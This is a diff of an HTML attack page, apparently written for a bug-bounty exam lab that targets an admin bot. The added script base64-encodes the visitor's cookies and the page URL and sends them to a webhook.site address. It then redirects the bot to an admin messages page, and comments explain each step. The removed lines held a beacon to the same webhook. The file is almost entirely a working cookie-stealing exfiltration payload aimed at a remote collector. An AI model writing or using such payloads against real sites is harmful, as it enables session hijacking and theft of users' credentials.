@@ -1,13 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta http-equiv="refresh" content="0;url=https://bugbounty-exam.hashacademy.co/admin/messages/69e37c20bee6d6b7c662cdec">
-</head>
 <body>
     <script>
-        // Backup JS redirect just in case
-        fetch('https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/BOT_VISIT_CONFIRMED');
-        window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/69e37c20bee6d6b7c662cdec";
+        // 1. First, try to grab the cookies (if not HttpOnly)
+        const cookies = document.cookie ? btoa(document.cookie) : 'no_cookies';
+
+        // 2. Redirect the bot to the Admin Ticket page
+        // But we add a small delay to try and exfiltrate the URL it's on first
+        const currentUrl = btoa(window.location.href);
+        
+        // 3. The "Double Whammy":
+        // This script will try to send the bot to the admin message, 
+        // while also sending a hit to your webhook with any info it can find.
+        
+        location.href = 'https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/?info=' + cookies + '&loc=' + currentUrl;
+
+        // 4. Force a second redirect to the admin panel after 1 second 
+        // in case the bot stays on the page
+        setTimeout(() => {
+            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/69e37c20bee6d6b7c662cdec";
+        }, 1000);
     </script>
 </body>
 </html>
